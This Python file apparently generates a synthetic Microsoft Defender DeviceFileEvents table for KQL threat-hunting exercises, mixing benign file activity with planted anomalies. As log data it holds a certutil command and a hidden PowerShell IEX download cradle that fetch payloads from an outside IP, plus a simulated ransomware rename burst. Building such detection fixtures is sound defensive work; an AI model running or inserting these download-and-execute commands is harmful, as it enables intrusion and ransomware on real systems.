"""Synthetic dataset mimicking a simplified Microsoft Defender for Endpoint
`DeviceFileEvents` table: routine file activity, the drops of
`update.dll`/`payload.exe`/`update.exe`/`oledlg.dll` already implied by
`device_process_events.py`'s other anomalies, and a mass file-rename burst
matching its ransomware chain.

Generation is fully deterministic (no `random` module involved), matching the
convention in `device_process_events.py`/`device_logon_events.py`.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any

from core.kql_engine.ast_nodes import KqlType

from .schema import ColumnSchema, TableSchema

SCHEMA = TableSchema(
    name="DeviceFileEvents",
    columns=[
        ColumnSchema("Timestamp", KqlType.DATETIME, "Czas zdarzenia na pliku (UTC)."),
        ColumnSchema("DeviceName", KqlType.STRING, "Nazwa hosta."),
        ColumnSchema("ActionType", KqlType.STRING, "'FileCreated', 'FileModified' lub 'FileDeleted'."),
        ColumnSchema("FileName", KqlType.STRING, "Nazwa pliku."),
        ColumnSchema("FolderPath", KqlType.STRING, "Pełna ścieżka do pliku."),
        ColumnSchema("SHA256", KqlType.STRING, "Skrót SHA256 pliku (syntetyczny)."),
        ColumnSchema("InitiatingProcessFileName", KqlType.STRING, "Proces, który wykonał operację na pliku."),
        ColumnSchema(
            "InitiatingProcessCommandLine", KqlType.STRING, "Linia poleceń procesu inicjującego."
        ),
    ],
)

_BASE_TIME = datetime(2026, 8, 10, 8, 0, 0, tzinfo=timezone.utc)
_DEVICES = ["WIN-CLIENT01", "WIN-CLIENT02", "WIN-CLIENT03", "WIN-SRV01", "WIN-SRV02"]

_BENIGN_FILES: list[tuple[str, str, str]] = [
    ("raport.docx", r"C:\Users\Public\Documents", "WINWORD.EXE"),
    ("notes.txt", r"C:\Users\Public\Desktop", "notepad.exe"),
    ("cache.dat", r"C:\Users\Public\AppData\Local\Microsoft\OneDrive", "OneDrive.exe"),
    ("teams-meeting.ics", r"C:\Users\Public\Downloads", "Teams.exe"),
]

# Each row here is the file-drop evidence behind a specific process-execution
# anomaly in device_process_events.py, same device/timestamp.
_ANOMALIES: list[dict[str, Any]] = [
    {
        # dropped just before WIN-CLIENT03's rundll32 anomaly (+4h40m)
        "Timestamp": _BASE_TIME + timedelta(hours=4, minutes=39),
        "DeviceName": "WIN-CLIENT03",
        "ActionType": "FileCreated",
        "FileName": "update.dll",
        "FolderPath": r"C:\Users\Public\update.dll",
        "SHA256": "1a2b3c4d5e6f70819203a4b5c6d7e8f9",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
    {
        # dropped by the certutil anomaly on WIN-SRV01 (+5h12m)
        "Timestamp": _BASE_TIME + timedelta(hours=5, minutes=12),
        "DeviceName": "WIN-SRV01",
        "ActionType": "FileCreated",
        "FileName": "payload.exe",
        "FolderPath": r"C:\Users\Public\payload.exe",
        "SHA256": "2b3c4d5e6f70819203a4b5c6d7e8f9a1",
        "InitiatingProcessFileName": "certutil.exe",
        "InitiatingProcessCommandLine": (
            r"certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Users\Public\payload.exe"
        ),
    },
    {
        # dropped just before WIN-CLIENT01's schtasks persistence anomaly (+8h1m)
        "Timestamp": _BASE_TIME + timedelta(hours=7, minutes=58),
        "DeviceName": "WIN-CLIENT01",
        "ActionType": "FileCreated",
        "FileName": "update.exe",
        "FolderPath": r"C:\Users\Public\update.exe",
        "SHA256": "3c4d5e6f70819203a4b5c6d7e8f9a1b2",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessCommandLine": (
            r'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient)'
            r".DownloadString('http://185.220.101.5/stage2.ps1')\""
        ),
    },
    {
        # dropped alongside the hpreader.exe DLL-sideloading anomaly in
        # device_process_events.py (+9h2m) - extracted from an archive just
        # before that process ran.
        "Timestamp": _BASE_TIME + timedelta(hours=9, minutes=1),
        "DeviceName": "WIN-CLIENT03",
        "ActionType": "FileCreated",
        "FileName": "oledlg.dll",
        "FolderPath": r"C:\Users\mwisniewski\Downloads\HPReader\oledlg.dll",
        "SHA256": "4d5e6f70819203a4b5c6d7e8f9a1b2c3",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
]


def _ransomware_rename_burst(count: int = 40) -> list[dict[str, Any]]:
    # T1486 - mass file encryption right after the servertool.exe anomaly in
    # device_process_events.py (+11h20m): every renamed file gets the
    # ransomware's extension, all within a few minutes on one device - the
    # burst itself (not any single file) is the detectable signal.
    start = _BASE_TIME + timedelta(hours=11, minutes=21)
    rows = []
    for i in range(count):
        rows.append(
            {
                "Timestamp": start + timedelta(seconds=i * 3),
                "DeviceName": "WIN-SRV02",
                "ActionType": "FileRenamed",
                "FileName": f"document_{i:03d}.docx.prinzeugen",
                "FolderPath": rf"C:\Users\Public\Documents\document_{i:03d}.docx.prinzeugen",
                "SHA256": f"{'1' * 24}{i:08d}",
                "InitiatingProcessFileName": "servertool.exe",
                "InitiatingProcessCommandLine": r"C:\Users\administrator\Music\servertool.exe --delete C:\Users",
            }
        )
    return rows


_ANOMALIES = _ANOMALIES + _ransomware_rename_burst()


def _benign_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for i in range(count):
        device = _DEVICES[i % len(_DEVICES)]
        filename, folder, process = _BENIGN_FILES[i % len(_BENIGN_FILES)]
        rows.append(
            {
                "Timestamp": _BASE_TIME + timedelta(minutes=i * 5),
                "DeviceName": device,
                "ActionType": "FileCreated",
                "FileName": filename,
                "FolderPath": f"{folder}\\{filename}",
                "SHA256": f"{'0' * 24}{i:08d}",
                "InitiatingProcessFileName": process,
                "InitiatingProcessCommandLine": process,
            }
        )
    return rows


def _build_rows() -> list[dict[str, Any]]:
    rows = _benign_rows(80) + _ANOMALIES
    rows.sort(key=lambda r: r["Timestamp"])
    return rows


ROWS: list[dict[str, Any]] = _build_rows()
